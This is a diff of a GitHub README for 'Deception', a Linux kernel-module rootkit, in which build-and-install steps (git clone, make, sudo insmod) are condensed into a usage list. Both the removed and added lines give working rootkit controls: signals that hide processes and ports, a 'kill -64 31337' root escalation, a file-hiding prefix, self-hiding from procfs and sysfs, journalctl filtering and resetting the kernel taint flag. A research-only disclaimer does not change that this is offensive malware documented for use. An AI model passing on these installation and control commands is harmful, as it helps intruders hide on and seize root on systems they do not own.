@@ -1,13 +1,4 @@
-<!--<img width="1280" height="640" alt="decption" src="https://github.com/user-attachments/assets/a26b026f-6d30-43fc-96cb-c3c6030855b9" />-->
-
-<!--<img width="1022" height="604" alt="ezgif-4ecac7eb7ff4c0b9-2" src="https://github.com/user-attachments/assets/4fd6cafc-9826-40e9-b3d7-8bc88063ebe7" /><br>-->
-
-<!--<img width="1024" height="682" alt="Deception (6)" src="https://github.com/user-attachments/assets/eb7d65bb-35e0-41cf-946f-01fa41037902" /><br>-->
-
 <img width="1024" height="600" alt="Deception (6)" src="https://repository-images.githubusercontent.com/1449993335/a542b6bd-8208-44d5-822a-38612251465a" /><br>
-
-<!--![url](https://repository-images.githubusercontent.com/1449993335/a542b6bd-8208-44d5-822a-38612251465a)<br>-->
-
 
 <b>Notice!</b> This software is provided solely for the purpose of research and is <b>not</b> intended to be used illegally or unethically. By cloning this repository or copying the source code herewithin, you are agreeing that you will <b>only</b> use this on your own machines for the purpose of research or on any other machine that you have permission to install it on. Use of this rootkit on systems which you do not have authorized access to <b>may</b> violate the computer fraud and abuse act.<br>
 
@@ -25,39 +16,13 @@
 <b>* Filters journalctl:</b> Deception does not show up anywhere in journalctl.<br>
 <b>* Sets kernel tainted_mask to 0:</b> in /proc/sys/kernel/tainted. Indicates that the kernel has not been tainted<br><br>
 
-Clone this repository, run make and install module
-```
-git clone https://github.com/carls0n/deception
-```
-```
-cd deception
-```
-```
-make
-```
-```
-sudo insmod deception.ko
-```
-Hide a process - hide as many processes as you want! Toggles visible/hidden.
-```
-kill -62 4214
-```
-Unhide all processes
-```
-kill -62 0
-```
-Hide a port. Hide as many ports as you want! Toggles visible/hidden state.
-```
-kill -61 8080
-```
-Unhide all ports
-```
-kill -61 0
-```
-Gain root privileges. Magic number can be configured in source code
-```
-kill -64 31337
-```
-Starts out hidden from both procfs and sysfs. Can't be removed without a reboot.
+### Deception rootkit usage<br>
+<b>* kill -61 [port]:</b> Hide a port. Toggles visibility. kill -61 0 unhides all ports.<br>
+<b>* kill -62 [pid]:</b> Hide a process. Toggles visibility. kill -62 0 unhides all processes<br>
+<b>* kill -64 31337:</b> Gain root priviledges. Magic number is configurable in source code.<br>
+
+ \* Files and/or folders starting with magic prefix secret_ will be hidden.<br>
+\* Module starts out hidden from both procfs and sysfs. Cant uninsatll. You mst reboot.<br><br>
+
 
 You might also enjoy reading <a href="https://carls0n.github.io">defeating LKM and LD_PRELOAD rootkits for fun and profit</a>
